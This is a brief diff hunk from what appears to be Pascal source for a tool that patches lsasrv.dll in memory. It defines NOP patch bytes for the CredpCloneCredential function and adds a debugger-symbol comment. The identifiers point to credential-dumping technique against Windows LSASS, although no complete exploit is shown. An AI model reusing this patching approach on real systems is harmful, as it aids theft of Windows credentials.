@@ -408,7 +408,7 @@ const
   PATC_WN64_CredpCloneCredentialJmpShort:array[0..5] of byte=($90, $90, $90, $90, $90, $90);
 
 var
-  module:string='lsasrv.dll';
+  module:string='lsasrv.dll'; //dd lsasrv!CredpCloneCredential
   dummy:string;
   hprocess:thandle;
   after,backup:array of byte; //array[0..0] of byte;
